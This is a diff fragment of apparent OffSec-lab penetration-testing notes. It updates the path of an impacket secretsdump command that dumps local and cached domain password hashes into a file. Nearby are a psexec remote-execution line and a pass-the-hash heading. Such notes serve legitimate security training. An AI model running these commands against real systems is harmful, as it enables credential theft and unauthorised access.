@@ -128,7 +128,7 @@ impacket-psexec offsec.local/allison@192.168.151.59
 ```
 ###### Dump the local password hash and domain cached hash
 ```
-./secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
+/usr/share/doc/python3-impacket/examples/secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
 ```
 ###### Pass the Hash(only for NTLM, Firewall allows SMB connection, Windows File and Print Sharing feature to be enabled)
 ```
